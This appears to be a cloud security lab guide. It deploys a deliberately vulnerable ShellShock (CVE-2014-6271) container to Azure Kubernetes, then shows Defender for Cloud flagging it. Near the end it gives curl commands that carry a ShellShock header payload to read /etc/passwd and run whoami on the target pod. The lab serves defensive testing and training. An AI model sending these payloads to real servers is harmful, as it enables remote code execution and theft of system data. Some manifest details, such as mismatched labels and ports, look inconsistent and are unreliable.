# In this lab we will use a ShellShock vulnerable docker image from the Docker Hub, store it in the Azure ACR and from there deploy to Azure AKS

We will exploit Shell-Shock vulnerabilities to execute RCE from an attaker por running in the same cluster

Login to your Azure ACR registry where you will push the vulnerable image

```
docker login [LOGINSERVER] –u [USERNAME] –p [PASSWORD]
```

Download the shellshock container to your local build machine

```
docker pull vulnerables/cve-2014-6271
```

Run the following commands to properly tag your images to match your ACR account name.

```
 docker tag  vulnerables/cve-2014-6271  [ACR-LOGINSERVER]/
 
 ```

 push docker image to ACR

```
 docker push [ACR-LOGINSERVER]/cve-2014-6271
 ```
In the Azure Portal, navigate to your ACR account, and select Repositories under Services on the left-hand menu

Defender for cloud will trigger the scan in the ACR registry to look for vulnerabilities in the image

Now, we will deploy a kubernetes pod using the shell-shock image stored in the ACR

Note we export the pod using the port 8080

As we will connect from another pod in the cluster to exploit RCE vulnerabilities of this container, we need to create a Kubernetes Service and map it to this deployment using match labels

```
apiVersion: v1
kind: Service
metadata:
  name: service-shell-shock
spec:
  type: ClusterIP  # ClusterIP is the default service type even if not specified
  selector:
    tag: shell-shock
  ports:
  - name: port8080
    protocol: TCP
    port: 8080  # this is the service port
    targetPort: 80 # this is the container port
```

```
apiVersion: apps/v1
kind: Deployment
metadata:
  name: shell-shock
spec:
  selector:
    matchLabels:
      app: shell-shock
  template:
    metadata:
      labels:
        app: shell-shock # the label for the pods and the deployments
    spec:
      containers:
      - name: shell-shock
        image: k8sgoatacr.azurecr.io/cve-2014-6271:latest # IMPORTANT: update with your own repository
        imagePullPolicy: Always
        ports:
        - containerPort: 8080 
```
Get the pods ip address using 

```
kubectl get pods -o wide
```

Enter into the shell-shock container

```
kubectl exec -it [shell-shock-pod] -- /bin/bash
````

And from the nginx pod in the cluster, we wille exploit RCE

```
kubectl exec -it [name-nginx-attacker-pod] -- /bin/bash
```

From here, issue commands to list /etc/passwd

```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://[ip-address-shell-shock-pod]:80/cgi-bin/vulnerable
```
and
```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'whoami'" http://[ip-address-shell-shock-pod]/cgi-bin/vulnerable
```

Now, wait for Defender to raise a recommendation under the ACR to resolve vulnerabilities found

![container-vul](/images/container-vuln.png)

Also, you may want to use the Cloud Security Explorer with the specific CVE-ID


![container-vuln-cloudsecexplorer](/images/container-vuln-cloud-sec-explorer.png)

